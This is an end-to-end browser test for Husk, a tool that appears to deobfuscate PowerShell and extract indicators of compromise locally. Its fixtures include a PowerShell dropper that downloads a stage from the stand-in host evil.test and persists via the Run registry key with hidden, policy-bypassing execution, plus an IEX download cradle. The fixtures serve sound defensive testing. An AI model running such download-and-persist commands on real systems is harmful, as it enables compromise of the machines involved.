// Husk — PowerShell deobfuscation and IOC extraction, fully browser-local.
// SPDX-License-Identifier: PolyForm-Small-Business-1.0.0
// Required Notice: Copyright 2026 Mo4n6 (https://github.com/Mo4n6/tools)
//
// The whole chain, end to end: the built app, the published engine, the real UI.
//
// Unit tests cover the adapter against captured output and the loader against a
// fake worker. Neither can catch a wrong assumption about the boundary between
// them — and one was wrong: `readDropped` returns .NET's `byte[]`, which
// marshals to a Uint8Array, and the worker was decoding it as a hex string. The
// page threw `t.trim is not a function` and the Save button did nothing. Only
// driving the real thing finds that.
//
//   npm run build   # with VITE_HUSK_ENGINE_URL=/husk-engine/
//   cp -r <AppBundle> dist/husk-engine
//   node scripts/husk/engine/e2e.mjs
//
// Env: HUSK_DIST (default ./dist), HUSK_CHROME (default Playwright's own).
//
// Needs a browser: `npx playwright install chromium`, or point HUSK_CHROME at
// one you already have. The playwright package itself is a devDependency;
// `npm ci` installs it but not the browsers.

import { chromium } from 'playwright';
import { createServer } from 'node:http';
import { existsSync, readFileSync, statSync } from 'node:fs';
import { extname, join } from 'node:path';

const DIST = process.env.HUSK_DIST ?? 'dist';
const PORT = Number(process.env.HUSK_PORT ?? 4240);
const ORIGIN = `http://localhost:${PORT}`;
/**
 * The path the site is served at, so this can check the real Pages layout.
 *
 * On Pages the base is `/tools/`, derived from the repository name, and every
 * asset path in the built index.html carries it. Serving at `/` instead would
 * test a configuration that is never deployed.
 */
const BASE = (process.env.HUSK_BASE ?? '/').replace(/\/*$/, '/');

const TYPES = {
  '.html': 'text/html',
  '.js': 'text/javascript',
  '.css': 'text/css',
  '.json': 'application/json',
  '.wasm': 'application/wasm',
  '.dll': 'application/octet-stream',
  '.dat': 'application/octet-stream',
  '.svg': 'image/svg+xml',
  '.png': 'image/png',
  '.woff2': 'font/woff2',
  '.symbols': 'text/plain',
};

// A dropper: download, drop, persist. Everything an analyst wants in one line,
// and nothing that needs a real machine.
const DROPPER = [
  `$u='http://evil.test/stage2.ps1'`,
  `$p="$env:APPDATA\\Updater.ps1"`,
  `(New-Object Net.WebClient).DownloadFile($u,$p)`,
  `Set-Content -Path 'C:\\Users\\Public\\note.txt' -Value 'dropped'`,
  `Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name Updater -Value "powershell -w hidden -ep bypass -f $p"`,
].join('; ');

/**
 * The cradle, for the stage-2 check. The URL matches the stage supplied in the
 * panel by filename, which is the match that matters in practice: a sample
 * builds its URL at runtime, so the name is the only part an analyst can key
 * on before running it.
 */
const CRADLE = String.raw`IEX (New-Object Net.WebClient).DownloadString('http://evil.test/a/stage2.ps1?v=7')`;

/**
 * A stage served from the harness itself.
 *
 * Live mode needs somewhere to fetch from, and it cannot be a real URL: this
 * file asserts that nothing leaves the page. Same-origin satisfies both - the
 * request is real, goes through the fetch boundary like any other, and stays
 * local. It is deliberately not under `husk-engine/`, which the boundary lets
 * through untouched as a runtime asset.
 *
 * Kept although nothing fetches it today: fetching a stage from outside the
 * engine, on the main thread and asynchronously, is the way live mode could
 * work, and this is what that would be tested against.
 */
const LIVE_STAGE = String.raw`Set-Content -Path 'C:\Users\Public\live-stage-ran.txt' -Value 'live'`;
const LIVE_STAGE_PATH = 'husk-e2e-stage.ps1';

const serve = () =>
  createServer((request, response) => {
    let path = decodeURIComponent(request.url.split('?')[0]);
    if (BASE !== '/' && path.startsWith(BASE)) path = path.slice(BASE.length - 1);
    if (path === `/${LIVE_STAGE_PATH}`) {
      response.writeHead(200, { 'Content-Type': 'text/plain' });
      return response.end(LIVE_STAGE);
    }
    let file = join(DIST, path);
    // A single-page app: anything that is not a file is the shell.
    if (!existsSync(file) || statSync(file).isDirectory()) file = join(DIST, 'index.html');
    response.writeHead(200, { 'Content-Type': TYPES[extname(file)] ?? 'application/octet-stream' });
    response.end(readFileSync(file));
  });

let failures = 0;

function check(ok, what) {
  if (!ok) failures += 1;
  console.log(`  ${ok ? 'pass' : 'FAIL'}  ${what}`);
}

async function main() {
  if (!existsSync(join(DIST, 'husk-engine', '_framework', 'blazor.boot.json'))) {
    console.error(`no engine under ${DIST}/husk-engine — see the header of this file`);
    return 2;
  }

  const server = serve();
  await new Promise((ready) => server.listen(PORT, () => ready(undefined)));

  const browser = await chromium.launch({ executablePath: process.env.HUSK_CHROME });
  const page = await browser.newPage({ acceptDownloads: true });

  // The claim the whole tool rests on. Anything leaving the page fails the run.
  const offsite = [];
  page.on('request', (request) => {
    if (!request.url().startsWith(ORIGIN)) offsite.push(request.url());
  });
  const pageErrors = [];
  page.on('pageerror', (error) => pageErrors.push(String(error)));

  try {
    await page.goto(`${ORIGIN}${BASE}husk`, { waitUntil: 'networkidle' });

    const offer = page.locator('input[type=checkbox]');
    await offer.waitFor({ timeout: 30_000 });
    check((await offer.count()) === 1, 'the engine is offered once the probe finds it');

    await page.fill('#husk-input', DROPPER);
    await offer.check();
    await page.getByRole('button', { name: 'Analyse' }).click();

    // The summary line, not the checkbox label — "real PowerShell" appears in
    // both, and waiting on the label resolved immediately and read the page
    // mid-run. The interpunct is only in the summary.
    await page.waitForFunction(
      () => /real powershell\s*\u00b7/i.test(document.body.innerText),
      null,
      { timeout: 300_000 },
    );

    const text = (await page.locator('body').innerText()).toLowerCase();
    const shows = (needle) => text.includes(needle.toLowerCase());

    check(/real powershell\s*\u00b7/i.test(text), 'the result says which backend ran');
    check(shows('Files the sample wrote'), 'the dropped-file panel is there');
    check(shows('C:\\Users\\Public\\note.txt'), 'the dropped path is the one the sample used');
    check(shows('Registry the sample wrote'), 'the registry panel is there');
    check(shows('CurrentVersion\\Run'), 'the persistence key is reported');
    check(!shows('Shell Folders'), 'the values Husk seeded are not reported as writes');
    check(shows('http://evil.test/stage2.ps1'), 'the C2 URL was extracted');
    check(shows('provider'), 'each recorded call says where it was observed');

    // The payload leaving the sandbox for the analyst's own disk.
    const [download] = await Promise.all([
      page.waitForEvent('download', { timeout: 60_000 }),
      page.getByRole('button', { name: 'Save' }).first().click(),
    ]);
    check(
      download.suggestedFilename() === 'note.txt.malware',
      `the saved file is named for double-click safety (${download.suggestedFilename()})`,
    );

    // MIT lets these assemblies ship on the condition that the notice ships
    // with them, so a bundle without it is not deployable.
    const notice = await page.request.get(`${ORIGIN}${BASE}husk-engine/THIRD-PARTY-NOTICE.txt`);
    const noticeText = notice.ok() ? await notice.text() : '';
    check(notice.ok(), 'the third-party notice is served with the engine');
    check(
      noticeText.includes('Copyright (c) Microsoft Corporation') &&
        noticeText.includes('MIT License'),
      'the notice carries the copyright and the licence text MIT requires',
    );

    // A downloader's chain, through the product rather than the engine.
    //
    // The engine's own side of this is covered by stage2-probe.mjs. What only
    // the real page can show is the seam: the panel's state reaching the
    // worker and coming back as captured behaviour. Every bug this harness has
    // caught so far has been in a seam like that one.
    await page.getByRole('button', { name: 'Add a stage' }).click();
    await page.getByPlaceholder('stage2.ps1, or the whole URL, or * for anything').fill('stage2.ps1');
    await page
      .getByPlaceholder('What the server would have returned.')
      .fill(String.raw`Set-Content -Path 'C:\Users\Public\stage2-ran.txt' -Value 'second stage'`);
    await page.fill('#husk-input', CRADLE);
    await page.getByRole('button', { name: 'Analyse' }).click();

    // Waiting on the stage's own artifact, not on the backend line: that line
    // is already on the page from the first run and would match instantly.
    let chainFollowed = true;
    try {
      await page.waitForFunction(
        () => document.body.innerText.includes('stage2-ran.txt'),
        null,
        { timeout: 300_000 },
      );
    } catch {
      chainFollowed = false;
    }
    check(chainFollowed, 'a supplied stage runs, and what it wrote is reported');

    // No live fetching is offered, and that is load-bearing rather than a
    // preference. Writing this check as "live mode fetches a same-origin stage"
    // is what found the crash: the request went out, the stage was served, and
    // the engine worker died 2.8s later - every time, and never when the same
    // run downloaded nothing. A synchronous request from inside the engine is
    // the only kind a PowerShell proxy can return, and it takes the worker with
    // it. So the control is gone, and this asserts it stays gone.
    check(
      (await page.locator('#husk-live').count()) === 0,
      'no control offers to fetch an unmatched URL',
    );

    // A second sample in the same engine reports its own result and none of the
    // previous one's. The boundary ledger cannot fill at all without live
    // fetching, so this no longer covers the worker's drainBoundary() call -
    // see the port log. It still covers the per-run reset of everything else.
    await page.fill('#husk-input', String.raw`Set-Content -Path 'C:\Users\Public\second.txt' -Value 'x'`);
    await page.getByRole('button', { name: 'Analyse' }).click();
    let secondRan = true;
    try {
      await page.waitForFunction(
        () =>
          document.body.innerText.includes('second.txt') &&
          !document.body.innerText.includes('stage2-ran.txt'),
        null,
        { timeout: 300_000 },
      );
    } catch {
      secondRan = false;
    }
    check(secondRan, "the next sample reports its own result and not the last one's");

    check(pageErrors.length === 0, `no page errors${pageErrors.length ? `: ${pageErrors[0]}` : ''}`);
    check(offsite.length === 0, `nothing left the page${offsite.length ? `: ${offsite[0]}` : ''}`);
  } finally {
    await browser.close();
    server.close();
  }

  console.log(failures === 0 ? '\nall checks passed' : `\n${failures} CHECKS FAILED`);
  return failures === 0 ? 0 : 1;
}

process.exit(await main());
